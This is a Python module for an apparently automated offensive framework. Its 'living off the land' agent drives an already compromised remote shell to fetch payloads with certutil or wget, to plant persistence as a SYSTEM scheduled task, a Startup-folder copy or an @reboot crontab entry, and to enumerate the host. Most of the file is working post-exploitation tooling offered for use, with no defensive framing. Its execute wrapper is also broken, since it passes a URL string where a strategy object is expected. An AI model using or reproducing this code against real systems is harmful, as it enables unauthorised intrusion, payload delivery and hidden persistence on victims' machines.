from core.logger import log
from core.data_models import AgentData, Strategy
from core.data_models import Strategy, LivingOffTheLandReport, AttackPhase, ErrorType
from core.context_manager import ContextManager # Import ContextManager
import asyncio
import os
import time
from typing import List, Dict, Any, Optional

from core.base_agent import BaseAgent


class LivingOffTheLandAgent(BaseAgent):
    supported_phases = [AttackPhase.ESCALATION, AttackPhase.PERSISTENCE, AttackPhase.DEFENSE_EVASION] # Corrected and expanded phases
    required_tools = [] # Tools are LOLBAS, not external

    def __init__(self, context_manager: ContextManager = None, orchestrator=None, **kwargs): # Changed shared_data to context_manager
        super().__init__(context_manager, orchestrator, **kwargs) # Pass context_manager to super
        self.shell_manager = self.orchestrator.shell_manager
        self.report_class = LivingOffTheLandReport # Set report class

    async def run(self, strategy: Strategy, **kwargs) -> LivingOffTheLandReport:
        start_time = time.time()
        shell_id = strategy.context.get("shell_id")
        action = strategy.context.get("action")  # e.g., "download", "execute_command", "persist", "enumerate_system"
        target_os = strategy.context.get("target_os") # e.g., "windows", "linux"

        if not all([shell_id, action, target_os]):
            end_time = time.time()
            return LivingOffTheLandReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                shell_id=shell_id,
                errors=["Shell ID, action, or target_os not provided in strategy context."],
                error_type=ErrorType.CONFIGURATION,
                summary="LOLBAS execution failed: Missing required context."
            )

        log.phase(
            f"LivingOffTheLandAgent: Performing '{action}' on shell {shell_id} (OS: {target_os})")

        if action == "download":
            return await self._perform_download(shell_id, target_os, strategy.context, start_time)
        elif action == "execute_command":
            return await self._execute_lolbas_command(shell_id, target_os, strategy.context, start_time)
        elif action == "persist":
            return await self._perform_persistence(shell_id, target_os, strategy.context, start_time)
        elif action == "enumerate_system":
            return await self._enumerate_system(shell_id, target_os, strategy.context, start_time)
        else:
            end_time = time.time()
            return LivingOffTheLandReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                shell_id=shell_id,
                technique=action,
                command_executed="",
                errors=[f"Action '{action}' is not yet implemented or recognized."],
                error_type=ErrorType.LOGIC,
                summary=f"LOLBAS execution failed: Action '{action}' not implemented."
            )

    async def _perform_download(self, shell_id: str, target_os: str, context: dict, start_time: float) -> LivingOffTheLandReport:
        url = context.get("url")
        destination_path = context.get("destination_path")
        if not all([url, destination_path]):
            end_time = time.time()
            return LivingOffTheLandReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                shell_id=shell_id, technique="download", command_executed="",
                errors=["URL or destination_path not provided for download action."],
                error_type=ErrorType.CONFIGURATION,
                summary="LOLBAS download failed: Missing URL or destination path."
            )

        command = ""
        technique = ""
        if target_os.lower() == "windows":
            command = f"certutil.exe -urlcache -split -f \"{url}\" \"{destination_path}\""
            technique = "certutil_download"
        elif target_os.lower() == "linux":
            command = f"wget {url} -O {destination_path}" # Fallback to wget
            technique = "wget_download"
            # Add curl as an alternative
            # command = f"curl -o {destination_path} {url}"
            # technique = "curl_download"
        else:
            end_time = time.time()
            return LivingOffTheLandReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                shell_id=shell_id, technique="download", command_executed="",
                errors=[f"Unsupported OS for download action: {target_os}"],
                error_type=ErrorType.CONFIGURATION,
                summary=f"LOLBAS download failed: Unsupported OS {target_os}."
            )

        log.info(f"Attempting to download via {technique}: {command}")
        try:
            output = await self.shell_manager.send_command(shell_id, command, timeout=120)
            if "completed successfully" in output or "saved" in output.lower(): # Generic check for success
                log.success(f"Successfully downloaded file using {technique}.")
                end_time = time.time()
                return LivingOffTheLandReport(
                    agent_name=self.__class__.__name__,
                    start_time=start_time,
                    end_time=end_time,
                    shell_id=shell_id, technique=technique, command_executed=command,
                    summary="File downloaded successfully."
                )
            else:
                log.error(f"{technique} command failed. Output: {output}")
                end_time = time.time()
                return LivingOffTheLandReport(
                    agent_name=self.__class__.__name__,
                    start_time=start_time,
                    end_time=end_time,
                    shell_id=shell_id, technique=technique, command_executed=command,
                    errors=[f"{technique} command failed: {output}"],
                    error_type=ErrorType.LOGIC,
                    summary=f"LOLBAS download failed: {technique} command failed."
                )
        except Exception as e:
            log.error(f"Exception during {technique} download: {e}")
            end_time = time.time()
            return LivingOffTheLandReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                shell_id=shell_id, technique=technique, command_executed=command,
                errors=[f"Exception: {e}"],
                error_type=ErrorType.LOGIC,
                summary=f"LOLBAS download failed due to exception: {e}"
            )

    async def _execute_lolbas_command(self, shell_id: str, target_os: str, context: dict, start_time: float) -> LivingOffTheLandReport:
        command_to_execute = context.get("command")
        if not command_to_execute:
            end_time = time.time()
            return LivingOffTheLandReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                shell_id=shell_id, technique="execute_command", command_executed="",
                errors=["Command to execute not provided."],
                error_type=ErrorType.CONFIGURATION,
                summary="LOLBAS command execution failed: Missing command."
            )
        
        log.info(f"Attempting to execute command via LOLBAS: {command_to_execute}")
        try:
            output = await self.shell_manager.send_command(shell_id, command_to_execute, timeout=300)
            if output and "Error:" not in output: # Simple check for success
                log.success(f"Command executed successfully. Output: {output}")
                end_time = time.time()
                return LivingOffTheLandReport(
                    agent_name=self.__class__.__name__,
                    start_time=start_time,
                    end_time=end_time,
                    shell_id=shell_id, technique="execute_command", command_executed=command_to_execute,
                    summary=f"Command executed. Output: {output}"
                )
            else:
                log.error(f"Command execution failed. Output: {output}")
                end_time = time.time()
                return LivingOffTheLandReport(
                    agent_name=self.__class__.__name__,
                    start_time=start_time,
                    end_time=end_time,
                    shell_id=shell_id, technique="execute_command", command_executed=command_to_execute,
                    errors=["Command execution failed.", output],
                    error_type=ErrorType.LOGIC,
                    summary="LOLBAS command execution failed."
                )
        except Exception as e:
            log.error(f"Exception during command execution: {e}")
            end_time = time.time()
            return LivingOffTheLandReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                shell_id=shell_id, technique="execute_command", command_executed=command_to_execute,
                errors=[f"Exception: {e}"],
                error_type=ErrorType.LOGIC,
                summary=f"LOLBAS command execution failed due to exception: {e}"
            )

    async def _perform_persistence(self, shell_id: str, target_os: str, context: dict, start_time: float) -> LivingOffTheLandReport:
        technique = context.get("technique") # e.g., "schtasks", "cronjob", "startup_folder"
        payload_path = context.get("payload_path") # Path to the payload to persist
        
        if not all([technique, payload_path]):
            end_time = time.time()
            return LivingOffTheLandReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                shell_id=shell_id, technique="persist", command_executed="",
                errors=["Persistence technique or payload path not provided."],
                error_type=ErrorType.CONFIGURATION,
                summary="LOLBAS persistence failed: Missing technique or payload path."
            )

        command = ""
        if target_os.lower() == "windows":
            if technique == "schtasks":
                command = f"schtasks /create /tn \"dLNkdLNk\" /tr \"{payload_path}\" /sc ONLOGON /ru SYSTEM /f"
            elif technique == "startup_folder":
                command = f"copy \"{payload_path}\" \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\""
            else:
                end_time = time.time()
                return LivingOffTheLandReport(
                    agent_name=self.__class__.__name__,
                    start_time=start_time,
                    end_time=end_time,
                    shell_id=shell_id, technique="persist", command_executed="",
                    errors=[f"Unsupported Windows persistence technique: {technique}"],
                    error_type=ErrorType.CONFIGURATION,
                    summary=f"LOLBAS persistence failed: Unsupported Windows technique {technique}."
                )
        elif target_os.lower() == "linux":
            if technique == "cronjob":
                command = f"(crontab -l 2>/dev/null; echo \"@reboot {payload_path}\") | crontab -"
            elif technique == "systemd":
                # This is more complex, requires writing a service file. Placeholder for now.
                end_time = time.time()
                return LivingOffTheLandReport(
                    agent_name=self.__class__.__name__,
                    start_time=start_time,
                    end_time=end_time,
                    shell_id=shell_id, technique="persist", command_executed="",
                    errors=["Linux systemd persistence not fully implemented yet."],
                    error_type=ErrorType.LOGIC,
                    summary="LOLBAS persistence failed: Linux systemd not implemented."
                )
            else:
                end_time = time.time()
                return LivingOffTheLandReport(
                    agent_name=self.__class__.__name__,
                    start_time=start_time,
                    end_time=end_time,
                    shell_id=shell_id, technique="persist", command_executed="",
                    errors=[f"Unsupported Linux persistence technique: {technique}"],
                    error_type=ErrorType.CONFIGURATION,
                    summary=f"LOLBAS persistence failed: Unsupported Linux technique {technique}."
                )
        else:
            end_time = time.time()
            return LivingOffTheLandReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                shell_id=shell_id, technique="persist", command_executed="",
                errors=[f"Unsupported OS for persistence action: {target_os}"],
                error_type=ErrorType.CONFIGURATION,
                summary=f"LOLBAS persistence failed: Unsupported OS {target_os}."
            )

        log.info(f"Attempting to establish persistence via {technique}: {command}")
        try:
            output = await self.shell_manager.send_command(shell_id, command, timeout=120)
            if output and "Error:" not in output:
                log.success(f"Persistence established using {technique}.")
                end_time = time.time()
                return LivingOffTheLandReport(
                    agent_name=self.__class__.__name__,
                    start_time=start_time,
                    end_time=end_time,
                    shell_id=shell_id, technique=technique, command_executed=command,
                    summary="Persistence established successfully."
                )
            else:
                log.error(f"Persistence failed. Output: {output}")
                end_time = time.time()
                return LivingOffTheLandReport(
                    agent_name=self.__class__.__name__,
                    start_time=start_time,
                    end_time=end_time,
                    shell_id=shell_id, technique=technique, command_executed=command,
                    errors=["Persistence failed.", output],
                    error_type=ErrorType.LOGIC,
                    summary="LOLBAS persistence failed."
                )
        except Exception as e:
            log.error(f"Exception during persistence: {e}")
            end_time = time.time()
            return LivingOffTheLandReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                shell_id=shell_id, technique=technique, command_executed=command,
                errors=[f"Exception: {e}"],
                error_type=ErrorType.LOGIC,
                summary=f"LOLBAS persistence failed due to exception: {e}"
            )

    async def _enumerate_system(self, shell_id: str, target_os: str, context: dict, start_time: float) -> LivingOffTheLandReport:
        # This is a simplified example. A real enumeration would involve many commands.
        commands = []
        if target_os.lower() == "windows":
            commands = [
                "systeminfo",
                "whoami /priv",
                "net user",
                "tasklist",
                "ipconfig /all"
            ]
        elif target_os.lower() == "linux":
            commands = [
                "uname -a",
                "id",
                "ip a",
                "ps aux",
                "ls -la /etc/passwd"
            ]
        else:
            end_time = time.time()
            return LivingOffTheLandReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                shell_id=shell_id, technique="enumerate_system", command_executed="",
                errors=[f"Unsupported OS for system enumeration: {target_os}"],
                error_type=ErrorType.CONFIGURATION,
                summary=f"LOLBAS enumeration failed: Unsupported OS {target_os}."
            )
        
        full_output = []
        for cmd in commands:
            log.info(f"Executing enumeration command: {cmd}")
            output = await self.shell_manager.send_command(shell_id, cmd, timeout=60)
            full_output.append(f"--- Command: {cmd} ---\n{output}\n")
        
        end_time = time.time()
        if full_output:
            log.success("System enumeration completed.")
            return LivingOffTheLandReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                shell_id=shell_id, technique="enumerate_system", command_executed="; ".join(commands),
                summary="System enumeration performed.", output="\n".join(full_output)
            )
        else:
            log.error("System enumeration failed.")
            return LivingOffTheLandReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                shell_id=shell_id, technique="enumerate_system", command_executed="; ".join(commands),
                errors=["System enumeration failed: No output from commands."],
                error_type=ErrorType.LOGIC,
                summary="LOLBAS enumeration failed."
            )

    async def execute(self, strategy: Strategy) -> AgentData:
        """Execute living off the land agent"""
        try:
            target = strategy.context.get('target_url', '')
            
            # Call existing method
            if asyncio.iscoroutinefunction(self.run):
                results = await self.run(target)
            else:
                results = self.run(target)
            
            return AgentData(
                agent_name=self.__class__.__name__,
                success=True,
                summary=f"{self.__class__.__name__} completed successfully",
                errors=[],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={'results': results}
            )
        except Exception as e:
            return AgentData(
                agent_name=self.__class__.__name__,
                success=False,
                summary=f"{self.__class__.__name__} failed",
                errors=[str(e)],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={}
            )
